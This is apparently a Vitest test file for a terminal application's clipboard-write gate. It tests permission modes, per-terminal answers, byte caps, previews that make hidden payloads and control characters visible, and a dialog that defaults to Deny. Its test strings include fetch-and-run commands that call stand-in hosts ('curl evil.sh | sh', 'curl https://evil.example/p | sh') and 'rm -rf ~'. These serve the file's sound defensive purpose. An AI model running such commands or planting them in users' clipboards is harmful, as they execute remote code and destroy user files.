// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  CLIPBOARD_MAX_BYTES,
  ClipboardGate,
  isMultiline,
  previewText,
  utf8Length,
  type ClipboardAnswer,
} from "./clipboard_gate";
import type { ClipboardWritesMode } from "./ipc";
import { choiceDialog } from "./dialog";
import { clampSettings, defaultSettings } from "./settings";
import { SettingsPane } from "./settings_pane";
import { stubSettings } from "./term/test-utils";

/** A gate over recording fakes. `answers` feeds the confirm, in order
 *  (`true` = "Allow", `false` = "Deny"); an answer of `"hold"` leaves that
 *  confirm pending until `release()`. */
function makeGate(mode: ClipboardWritesMode, answers: Array<boolean | ClipboardAnswer | "hold"> = []) {
  let current = mode;
  const written: string[] = [];
  const notices: string[] = [];
  const logs: string[] = [];
  const prompts: Array<{ label: string; preview: string; chars: number }> = [];
  const multiline: boolean[] = [];
  const held: Array<(v: ClipboardAnswer) => void> = [];
  const gate = new ClipboardGate({
    mode: () => current,
    confirm: (label, preview, chars, many) => {
      prompts.push({ label, preview, chars });
      multiline.push(many);
      const a = answers.shift() ?? false;
      if (a === "hold") return new Promise<ClipboardAnswer>((resolve) => held.push(resolve));
      return Promise.resolve(a === true ? "always" : a === false ? "deny" : a);
    },
    write: vi.fn(async (text: string) => {
      written.push(text);
    }),
    notice: (m) => notices.push(m),
    log: (m) => logs.push(m),
  });
  return {
    gate,
    written,
    notices,
    logs,
    prompts,
    multiline,
    setMode: (m: ClipboardWritesMode) => {
      current = m;
    },
    release: (v: boolean | ClipboardAnswer) => held.shift()!(v === true ? "always" : v === false ? "deny" : v),
  };
}

afterEach(() => {
  document.body.textContent = "";
});

describe("ClipboardGate — off", () => {
  it("drops every store without prompting, writing or noticing, and logs it", async () => {
    const g = makeGate("off");
    expect(await g.gate.handle(1, "bash", "curl evil.sh | sh")).toBe("dropped");
    expect(g.written).toEqual([]);
    expect(g.prompts).toEqual([]);
    expect(g.notices).toEqual([]);
    expect(g.logs.some((l) => /off/.test(l))).toBe(true);
  });
});

describe("ClipboardGate — allow", () => {
  it("applies the store and shows a notice naming the terminal", async () => {
    const g = makeGate("allow");
    expect(await g.gate.handle(1, "vim", "hello")).toBe("applied");
    expect(g.written).toEqual(["hello"]);
    expect(g.prompts).toEqual([]);
    expect(g.notices).toEqual(["vim set the clipboard"]);
  });

  it("shows no notice when the clipboard write itself fails", async () => {
    const notices: string[] = [];
    const gate = new ClipboardGate({
      mode: () => "allow",
      confirm: async () => "always",
      write: async () => {
        throw new Error("denied");
      },
      notice: (m) => notices.push(m),
      log: () => {},
    });
    expect(await gate.handle(1, "vim", "x")).toBe("dropped");
    expect(notices).toEqual([]);
  });
});

describe("ClipboardGate — ask", () => {
  it("prompts on the first store, applies on Allow, and does not ask that terminal again", async () => {
    const g = makeGate("ask", [true]);
    expect(await g.gate.handle(7, "tmux", "first")).toBe("applied");
    expect(g.prompts).toEqual([{ label: "tmux", preview: "first", chars: 5 }]);
    expect(await g.gate.handle(7, "tmux", "second")).toBe("applied");
    expect(g.prompts).toHaveLength(1);
    expect(g.written).toEqual(["first", "second"]);
    expect(g.notices).toEqual(["tmux set the clipboard", "tmux set the clipboard"]);
  });

  it("drops on Deny and keeps dropping that terminal's stores without asking", async () => {
    const g = makeGate("ask", [false]);
    expect(await g.gate.handle(3, "cat", "curl evil.sh | sh")).toBe("dropped");
    expect(await g.gate.handle(3, "cat", "again")).toBe("dropped");
    expect(g.prompts).toHaveLength(1);
    expect(g.written).toEqual([]);
    expect(g.notices).toEqual([]);
  });

  it("remembers per terminal: another terminal gets its own prompt", async () => {
    const g = makeGate("ask", [true, false]);
    expect(await g.gate.handle(1, "a", "x")).toBe("applied");
    expect(await g.gate.handle(2, "b", "y")).toBe("dropped");
    expect(g.prompts.map((p) => p.label)).toEqual(["a", "b"]);
    expect(await g.gate.handle(1, "a", "z")).toBe("applied");
    expect(await g.gate.handle(2, "b", "w")).toBe("dropped");
    expect(g.prompts).toHaveLength(2);
  });

  it("drops stores that arrive while the prompt is open — never queued and replayed", async () => {
    const g = makeGate("ask", ["hold"]);
    const first = g.gate.handle(5, "agent", "one");
    expect(await g.gate.handle(5, "agent", "two")).toBe("dropped");
    expect(await g.gate.handle(5, "agent", "three")).toBe("dropped");
    expect(g.prompts).toHaveLength(1);
    g.release(true);
    expect(await first).toBe("applied");
    expect(g.written).toEqual(["one"]);
  });

  it("forgets the answer when the terminal closes (ids can be recycled)", async () => {
    const g = makeGate("ask", [true, false]);
    await g.gate.handle(9, "old", "x");
    g.gate.forget(9);
    expect(await g.gate.handle(9, "new", "y")).toBe("dropped");
    expect(g.prompts.map((p) => p.label)).toEqual(["old", "new"]);
  });

  it("a terminal that closed mid-prompt does not hand its answer to a recycled id", async () => {
    const g = makeGate("ask", ["hold", false]);
    const pending = g.gate.handle(4, "old", "x");
    g.gate.forget(4);
    g.release(true);
    await pending;
    // The recycled id is asked afresh rather than inheriting "allowed".
    expect(await g.gate.handle(4, "new", "y")).toBe("dropped");
    expect(g.prompts).toHaveLength(2);
  });

  it("does not apply an allowed store if writes were switched off while it was open", async () => {
    const g = makeGate("ask", ["hold"]);
    const pending = g.gate.handle(1, "a", "x");
    g.setMode("off");
    g.release(true);
    expect(await pending).toBe("dropped");
    expect(g.written).toEqual([]);
  });
});

describe("ClipboardGate — size cap", () => {
  const big = "a".repeat(CLIPBOARD_MAX_BYTES + 1);

  for (const mode of ["off", "ask", "allow"] as const) {
    it(`drops a payload over the cap in ${mode} mode without prompting`, async () => {
      const g = makeGate(mode, [true]);
      expect(await g.gate.handle(1, "x", big)).toBe("dropped");
      expect(g.prompts).toEqual([]);
      expect(g.written).toEqual([]);
      expect(g.notices).toEqual([]);
    });
  }

  it("applies a payload exactly at the cap", async () => {
    const g = makeGate("allow");
    expect(await g.gate.handle(1, "x", "a".repeat(CLIPBOARD_MAX_BYTES))).toBe("applied");
  });

  it("measures the cap in UTF-8 bytes, not characters", async () => {
    // 3 bytes each: under the cap by characters, over it by bytes.
    const wide = "€".repeat(Math.floor(CLIPBOARD_MAX_BYTES / 3) + 1);
    expect(utf8Length(wide)).toBeGreaterThan(CLIPBOARD_MAX_BYTES);
    const g = makeGate("allow");
    expect(await g.gate.handle(1, "x", wide)).toBe("dropped");
  });
});

describe("previewText", () => {
  it("shows the start and the end, and says how much lies between", () => {
    const text = `${"a".repeat(48)}${"x".repeat(100)}${"z".repeat(32)}`;
    expect(previewText(text)).toBe(`${"a".repeat(48)} …(100 more characters)… ${"z".repeat(32)}`);
    expect(previewText("short")).toBe("short");
    // A payload after harmless-looking text is in the preview.
    const hidden = `${"echo hello ".repeat(20)}; curl https://evil.example/p | sh`;
    expect(previewText(hidden)).toContain("evil.example/p␣|␣sh");
  });

  it("makes whitespace and control characters visible", () => {
    expect(previewText("ls\r\nrm -rf ~\t\u001b[2K\u007f ")).toBe(
      "ls␍␊rm␣-rf␣~␉␛[2K␡␣",
    );
  });

  it("makes C1 and bidi/zero-width formatting characters visible", () => {
    expect(previewText("a\u009bb‮c​d")).toBe("a\\u{9b}b\\u{202e}c\\u{200b}d");
  });
});

describe("clipboardWrites setting (frontend mirror)", () => {
  it("defaults to ask", () => {
    expect(defaultSettings().clipboardWrites).toBe("ask");
    expect(clampSettings({}).clipboardWrites).toBe("ask");
  });

  it("keeps the three known modes and loads anything else as ask", () => {
    for (const m of ["off", "ask", "allow"] as const) {
      expect(clampSettings({ clipboardWrites: m }).clipboardWrites).toBe(m);
    }
    for (const bad of ["ALLOW", "always", "", 1, null, true]) {
      expect(clampSettings({ clipboardWrites: bad as unknown as "ask" }).clipboardWrites).toBe("ask");
    }
  });

  it("is a picker on the settings pane that persists immediately", async () => {
    const harness = stubSettings({});
    await harness.store.load();
    const pane = new SettingsPane({ store: harness.store });
    pane.open();
    const picker = pane.element.querySelector<HTMLElement>('[data-setting="clipboardWrites"]')!;
    expect(picker).not.toBeNull();
    const buttons = [...picker.querySelectorAll("button")];
    expect(buttons.map((b) => b.textContent)).toEqual(["Off", "Ask", "Allow"]);
    buttons[0].click();
    await Promise.resolve();
    await Promise.resolve();
    expect(harness.saved()!.clipboardWrites).toBe("off");
    pane.dispose();
  });
});

describe("ClipboardGate — allow once and multi-line text", () => {
  it("Allow once applies that store only; the next one asks again", async () => {
    const g = makeGate("ask", ["once", "once"]);
    expect(await g.gate.handle(1, "vim", "one")).toBe("applied");
    expect(await g.gate.handle(1, "vim", "two")).toBe("applied");
    expect(g.prompts).toHaveLength(2);
    expect(g.written).toEqual(["one", "two"]);
  });

  it("asks again for text with a line break even from an allowed terminal", async () => {
    const g = makeGate("ask", [true, "once"]);
    expect(await g.gate.handle(1, "vim", "plain")).toBe("applied");
    expect(await g.gate.handle(1, "vim", "still plain")).toBe("applied");
    expect(g.prompts).toHaveLength(1);
    expect(await g.gate.handle(1, "vim", "ls\nrm -rf ~")).toBe("applied");
    expect(g.prompts).toHaveLength(2);
    expect(g.multiline).toEqual([false, true]);
    expect(g.prompts[1].preview).toBe("ls␊rm␣-rf␣~");
    // Allow once left the terminal allowed for single-line text.
    expect(await g.gate.handle(1, "vim", "again")).toBe("applied");
    expect(g.prompts).toHaveLength(2);
  });

  it("a Deny on the multi-line ask denies the terminal", async () => {
    const g = makeGate("ask", [true, false]);
    await g.gate.handle(1, "vim", "plain");
    expect(await g.gate.handle(1, "vim", "a\r\nb")).toBe("dropped");
    expect(await g.gate.handle(1, "vim", "plain")).toBe("dropped");
    expect(g.written).toEqual(["plain"]);
  });

  it("counts every kind of line break", () => {
    for (const t of ["a\nb", "a\rb", "a\u0085b", "a\u2028b", "a\u2029b"]) expect(isMultiline(t)).toBe(true);
    expect(isMultiline("a\tb c")).toBe(false);
  });
});

describe("the confirm's safe default", () => {
  const press = (key: string): void => {
    document.dispatchEvent(new KeyboardEvent("keydown", { key, bubbles: true, cancelable: true }));
  };
  const ask = () =>
    choiceDialog<ClipboardAnswer>("set clipboard?", { label: "Deny", value: "deny" }, [
      { label: "Allow once", value: "once" },
      { label: "Allow", value: "always" },
    ]);

  it("focuses Deny and treats a stray Enter as Deny", async () => {
    const answer = ask();
    const cancel = document.querySelector<HTMLButtonElement>(".chappa-dialog-cancel")!;
    expect(cancel.textContent).toBe("Deny");
    expect(document.activeElement).toBe(cancel);
    press("Enter");
    expect(await answer).toBe("deny");
  });

  it("offers Allow once beside Allow, each answering its own value", async () => {
    const once = ask();
    const labels = [...document.querySelectorAll<HTMLButtonElement>("button")].map((b) => b.textContent);
    expect(labels).toEqual(["Deny", "Allow once", "Allow"]);
    document.querySelector<HTMLButtonElement>(".chappa-dialog-choice")!.click();
    expect(await once).toBe("once");
    const always = ask();
    document.querySelector<HTMLButtonElement>(".chappa-dialog-ok")!.click();
    expect(await always).toBe("always");
  });

  it("Enter answers the focused allow button, Escape denies", async () => {
    const once = ask();
    document.querySelector<HTMLButtonElement>(".chappa-dialog-choice")!.focus();
    press("Enter");
    expect(await once).toBe("once");
    const esc = ask();
    press("Escape");
    expect(await esc).toBe("deny");
  });
});
